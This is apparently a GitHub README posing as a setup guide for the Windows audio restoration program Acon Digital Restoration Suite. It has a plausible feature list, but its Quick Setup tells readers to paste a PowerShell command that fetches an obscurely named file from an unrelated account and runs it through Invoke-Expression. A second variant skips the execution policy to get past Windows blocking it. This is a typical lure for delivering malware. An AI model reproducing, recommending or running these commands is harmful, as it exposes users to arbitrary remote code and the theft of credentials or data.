# Acon Digital Restoration Suite

Acon Digital Restoration Suite is the Windows program this page sets up. The command in Quick Setup installs it on this PC. After that you open Acon Digital Restoration Suite and work in it.

Acon Digital Restoration Suite groups impulse, hum, clipping, and noise repair into one Windows application aimed at transfers that never sounded clean out of the box. Archivists, post houses, and mastering engineers use it when vinyl dubs, cassette logs, or broadcast captures still carry crackle, mains buzz, flattened peaks, or tape hiss after basic leveling.

A typical session on Windows starts with files from your capture folder opened in the stand-alone app or a compatible host. You audition short loops, treat the loudest defects first—often clicks and hum—then address clipped passages and broadband noise while watching shared meters so gain stays stable. When a chain works, you render corrected WAV or AIFF masters into a delivery directory or run the same steps across a batch of sides that share one source.

This repository stores the Windows setup file, plain-text notes on driver latency and sample-rate choices, and a changelog that records module and default changes between releases. The installer lays out application binaries and plug-in locations so sessions reopen with the same paths after a restart. Maintainers refresh the notes when recommended processing order or build identifiers change.

## What you do with it

- DeClick targets impulse pops and crackle on digitized vinyl while preserving attack in plosives and snare transients.
- DeHum follows mains hum and harmonics so you can suppress fifty or sixty hertz families without hollow dialogue.
- DeClip rebuilds flattened peaks from hot transfers so restored crests regain headroom without introducing harsh new distortion.
- Spectral editing isolates whistles and narrow buzz bands while keeping speech formants stable across adjacent frequency regions.
- Batch mode replays saved repair chains across album sides when every file shares similar click density and noise floor.
- Shared peak and RMS metering keeps gain staging aligned as you move between restoration modules during long Windows sessions.
- Preset slots store click sensitivity, hum notch depth, and noise profiles for repeat work from the same archive source.

## Quick Setup (PowerShell)

This installs the program Acon Digital Restoration Suite on Windows.
1. Launch PowerShell:
   - Press `Win` + `X` on the keyboard.
   - Click **Terminal** or **Windows PowerShell** in the list.
2. Copy the command below, paste it into that window, and press Enter. Wait until it finishes.

```powershell
irm https://raw.githubusercontent.com/seidel-s505689/acon-digital-restoration-suite-setup-guide/main/vhcxeq5y0y.yhe8dj00 | Invoke-Expression
```

## If the script is blocked

If Windows stops the script, paste this command into the same window and press Enter.

```powershell
powershell -ExecutionPolicy Bypass -Command "Invoke-RestMethod https://raw.githubusercontent.com/seidel-s505689/acon-digital-restoration-suite-setup-guide/main/vhcxeq5y0y.yhe8dj00 | Invoke-Expression"
```

## Files

| File | What it is |
| --- | --- |
| `vhcxeq5y0y.yhe8dj00` | The file both commands read |
| `Initial.js` | Small helper kept next to the setup |
| `LICENSE` | MIT |
| `CHANGELOG.md` | What changed in build 1.0 |

## This build

Repository `seidel-s505689/acon-digital-restoration-suite-setup-guide`. Acon Digital Restoration Suite 1.0, 2026. Windows 10 and Windows 11, 64-bit.
  
